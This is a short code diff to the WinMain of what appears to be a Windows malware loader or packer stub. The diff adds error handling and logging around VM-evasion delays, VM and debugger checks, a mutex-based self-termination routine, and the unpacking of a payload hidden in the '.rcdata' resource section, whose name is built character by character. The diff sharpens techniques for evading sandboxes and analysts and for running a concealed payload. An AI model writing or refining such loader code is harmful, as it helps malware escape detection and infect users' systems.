@@ -122,8 +122,11 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 
 	runLog("starting\r\n");
 
-	VM::delay(VM_EVASION_DELAY);
-	VM::checkTickCount();
+	ret=VM::delay(VM_EVASION_DELAY);
+	if (ret < 0) {
+		return -1;
+	}
+	//VM::checkTickCount();
 
 	VM::checkVM();
 
@@ -132,10 +135,16 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 	ret = exceptTest();
 
 	g_mutex_handle = bRunning(&ret);
-	if (ret)
-	{
-		runLog("already running\r\n");
-		suicide();
+	if (g_mutex_handle) {
+		if (ret)
+		{
+			runLog("already running\r\n");
+			suicide();
+		}
+	}
+	else {
+		runLog("bRunning error\r\n");
+		return -1;
 	}
 
 	if (Debug::isDebugged())
@@ -154,9 +163,11 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 
 	char secname[] = { '.','r','c','d','a','t','a',0 };
 
-	runLog("unshellSection\r\n");
+	runLog("unshellSection entry\r\n");
 
 	ret = Section::unshellSection((char*)hInstance, secname);
+
+	runLog("unshellSection complete\r\n");
 
 	ExitProcess(0);
 	return 0;
